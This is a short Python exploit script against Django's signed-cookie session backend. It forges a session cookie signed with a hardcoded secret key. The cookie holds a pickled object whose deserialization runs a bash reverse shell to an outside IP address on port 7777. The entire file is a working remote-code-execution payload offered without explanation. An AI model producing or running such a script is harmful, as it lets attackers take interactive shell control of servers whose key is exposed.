import urllib3

SECRET_KEY = 'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'
salt = "django.contrib.sessions.backends.signed_cookies"

import django.core.signing

import pickle

class PickleSerializer(object):
    """
    Simple wrapper around pickle to be used in signing.dumps and
    signing.loads.
    """
    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        return pickle.loads(data)


import subprocess
import base64

class Command(object):
    def __reduce__(self):
        return (subprocess.Popen, (('bash -c "bash -i >& /dev/tcp/124.222.21.138/7777 <&1"',),-1,None,None,None,None,None,False, True))

out_cookie= django.core.signing.dumps(
    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)
print(out_cookie)